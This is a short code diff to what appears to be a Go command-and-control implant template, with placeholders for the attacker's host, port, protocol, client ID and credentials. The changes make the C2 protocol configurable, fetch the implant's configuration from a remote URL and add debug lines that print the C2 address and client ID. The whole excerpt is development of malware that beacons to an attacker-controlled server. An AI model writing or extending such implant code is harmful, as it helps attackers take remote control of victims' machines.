@@ -49,7 +49,7 @@ var getipFailed bool
 var result_pwd string = ""
 
 const (
-    C2_URL     = "https://{lhost}:{lport}"
+    C2_URL     = "{protocol}://{lhost}:{lport}"
     CLIENT_ID  = "{line}"
     USERNAME   = "{username}"
     PASSWORD   = "{password}"
@@ -1755,11 +1755,14 @@ func main() {
         
     err := ReadJSONFromURL(url, &lazyconf)
 	if err != nil {
-        fmt.Println("Error:", err)
+        fmt.Println("[FATAL] Config read error:", err)
 		return
 	}
     if lazyconf.DebugImplant == "True" {
-        fmt.Println("[INFO] Reading JSON from URL:", url)
+        fmt.Println("[INIT] C2_URL:", C2_URL)
+        fmt.Println("[INIT] CLIENT_ID:", CLIENT_ID)
+        fmt.Println("[INIT] MALEABLE:", MALEABLE)
+        fmt.Println("[INIT] Config loaded, debug ON")
     }
     result_pwd, err = os.Getwd()
     if err != nil {
